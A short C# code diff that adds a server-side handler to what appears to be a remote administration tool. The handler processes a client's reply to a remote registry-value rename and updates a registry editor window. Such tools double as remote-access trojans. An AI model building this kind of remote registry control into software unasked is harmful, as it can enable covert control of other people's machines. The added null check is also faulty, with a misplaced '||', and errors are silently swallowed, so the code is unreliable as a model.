@@ -133,6 +133,26 @@ namespace xServer.Core.Commands
             catch { }
         }
 
+        public static void HandleRenameRegistryValue(xServer.Core.Packets.ClientPackets.GetRenameRegistryValueResponse packet, Client client)
+        {
+            try
+            {
+                // Make sure that the client is in the correct state to handle the packet appropriately.
+                if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
+                {
+                    if (!packet.IsError)
+                    {
+                        client.Value.FrmRe.RenameValueFromList(packet.KeyPath, packet.OldValueName, packet.NewValueName);
+                    }
+                    else
+                    {
+                        client.Value.FrmRe.ShowErrorMessage(packet.ErrorMsg);
+                    }
+                }
+            }
+            catch { }
+        }
+
         #endregion
     }
 }
